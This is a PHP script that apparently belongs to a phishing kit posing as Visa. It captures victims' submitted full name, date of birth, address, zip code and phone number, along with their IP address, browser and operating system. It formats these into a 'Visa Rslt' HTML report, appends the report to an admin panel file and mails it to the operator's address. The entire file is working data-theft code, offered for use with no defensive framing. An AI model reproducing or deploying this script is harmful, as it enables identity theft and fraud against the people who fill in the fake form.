
<?php

session_start();

include("system.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$fullname = $_SESSION['fullname'] = $_POST['fullname'];
$DateOfBritch = $_SESSION['DateOfBritch'] = $_POST['DateOfBritch'];
$StreetAddress = $_SESSION['StreetAddress'] = $_POST['StreetAddress'];
$StateRegion = $_SESSION['StateRegion'] = $_POST['StateRegion'];
$ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
$NumberPhone = $_SESSION['NumberPhone'] = $_POST['NumberPhone'];

$msgbank = '<html><head><style>body { background-color: #ededed;}p { display: block; -webkit-margin-before: 0.5em; -webkit-margin-after: 1em; -webkit-margin-start: 0px; -webkit-margin-end: 0px;}h1 { display: block; font-size: 3em; -webkit-margin-before: 0.67em; -webkit-margin-after: 0.67em; -webkit-margin-start: 1px; -webkit-margin-end: 1px; font-weight: bold;}#EYT {font-family: "Helvetica Neue Light","HelveticaNeue-Light","Helvetica Neue Light",Helvetica,Arial,sans-serif; font-size: 13px; color: #FFFFFF; text-decoration: none;}
#div1 {
    border-radius: 8px;
    padding: 20px;
    text-align: center;
    background: linear-gradient(to right, #191e5d, #122c95);    padding: 20px;
    border: 1px solid #1d1d3d;
}
#div2 { background-color: ; margin: 25px;}h1, h2, h3, h4, h5, h6 { font-family: "Segoe UI",Arial,sans-serif; font-weight: 400; margin: 10px 0;}h3 { font-size: 24px;}*, *:before, *:after { box-sizing: inherit;}#a:link, #a:visited { color: white; text-shadow: 2px 2px 4px #000000;border-radius: 8px; -webkit-transition: width 2s, height 4s; background: linear-gradient(to right, #024282, #007fff); color: white;border-radius: 4px; padding: 10px 115px; text-align: center; text-decoration: none; display: inline-block;}.w3-ul{list-style-type:none;padding:0;margin:0}.w3-ul li{padding:8px 16px;border-bottom:1px solid #a8a8a8}.w3-ul li:last-child{border-bottom:none}.w3-badge,.w3-tag{background-color:#41b1f2;color:#fff;display:inline-block;padding-left:8px;padding-right:8px;text-align:center}.w3-badge{border-radius:50%}.w3-container,.w3-panel{padding:0.01em 16px}.w3-panel{margin-top:16px;margin-bottom:16px}.w3-code,.w3-codespan{font-family:Consolas,"courier new";font-size:16px}#a:hover, #a:active { background: linear-gradient(to right, #045793, #0e8eea); background-color: #359cff; padding: 10px 115px;}.center {border-radius: 4px; margin: auto; width: 60%; background: linear-gradient(to right, #045793, #0e8eea); }.w3-green, .w3-hover-green:hover { color: #fff!important; background-color: #d9dbdd!important;}.w3-content { max-width: 980px; margin: auto;}.container { counter-reset: section; background: #a5a5a5; padding: 10px; font: 400 12px/1.8 "Lato", sans-serif; color: #a5a5a5;}</style></head><body><div class="center "><div id="div1"> <h1 style="color:#ffffff;">Visa Rslt</h1></div><div id=""><div class="container w3-content w3-green"><style>.w3-container,.w3-panel{padding:0.01em 16px}.w3-panel{margin-top:16px;margin-bottom:16px}.w3-code,.w3-codespan{font-family:Consolas,"courier new";font-size:16px}.w3-light-grey,.w3-hover-light-grey:hover,.w3-light-gray,.w3-hover-light-gray:hover{color:#000!important;background-color:#f1f1f1!important}.w3-round-large{border-radius:8px}.w3-round-xlarge{border-radius:16px}.w3-round-xxlarge{border-radius:32px}</style><div class="w3-container">
<div class="w3-panel w3-border w3-light-grey w3-round-large">
<h3 style="color:#505151">Crad visa,</h3><hr>
<h2>full Name : '.$_SESSION["fullname"].' </h2>
<h2>Date Of Britch  : '.$_SESSION["DateOfBritch"].' </h2>
<h2>Street Address : '.$_SESSION["StreetAddress"].' </h2>
<h2>State/Region : '.$_SESSION["StateRegion"].' </h2>
<h2>Zip Code : '.$_SESSION["ZipCode"].' </h2>
<h2>Number Phone : '.$_SESSION["NumberPhone"].' </h2>
<hr><h2>system : '.$OS.' </h2><h2>browser : '.$browserTy_Version.' </h2><h2>Ip Adress : '.$_SERVER["REMOTE_ADDR"].' </h2><h2>Date Time : '.$InfoDATE.' </h2></div></div><div style="text-align: center;"></div></div></div><div id="div1"><a href="#" id="EYT"><strong>Account</strong></a><a href="#" id="EYT"><strong>Help</strong></a><a href="#" id="EYT"><strong>Fees</strong></a><a href="#" id="EYT"><strong>Privacy/Cookies</strong></a><a href="#" id="EYT"><strong>Apps</strong></a><a href="#" id="EYT"><strong>Shop</strong></a></div></div></body></html>';



include("sand_email.php"); 


$f = fopen("../../adminpanel.php", "a");
	fwrite($f, $msgbank);


$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Biling Card Visa [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: V!SA" . "\r\n";
mail($yourmail, $subject, $msgbank, $headers);




?>



